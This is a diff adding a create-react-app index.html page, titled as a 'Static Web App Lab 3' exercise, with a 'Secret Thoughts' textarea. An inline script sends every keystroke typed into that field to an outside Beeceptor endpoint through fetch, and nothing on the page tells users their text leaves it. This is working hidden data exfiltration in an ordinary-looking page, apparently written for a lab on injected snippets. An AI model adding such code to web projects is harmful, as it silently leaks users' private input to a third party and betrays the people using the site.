@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <link rel="icon" href="%PUBLIC_URL%/favicon.ico" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#000000" />
+    <meta
+      name="description"
+      content="Web site created using create-react-app"
+    />
+    <link rel="apple-touch-icon" href="%PUBLIC_URL%/logo192.png" />
+    <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />
+    <title>React App</title>
+  </head>
+  <body>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+      const targetInput = document.getElementById("secretThoughts");
+
+      if (targetInput) {
+        targetInput.addEventListener("input", function (event) {
+          fetch(`https://forsure3.free.beeceptor.com?data=${encodeURIComponent(event.target.value)}`);
+        });
+      }
+    });
+    </script>
+
+    <div style="background-color: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center;">
+      <h1>Static Web App Lab 3 - Snippets</h1>
+      <div style="margin: 20px;">
+        <h2>Secret Thoughts</h2>
+        <textarea id="secretThoughts" rows="10" cols="50" placeholder="Paste your secret thoughts here..." style="width: 100%; max-width: 500px;"></textarea>
+      </div>
+    </div>
+
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root"></div>
+  </body>
+</html>
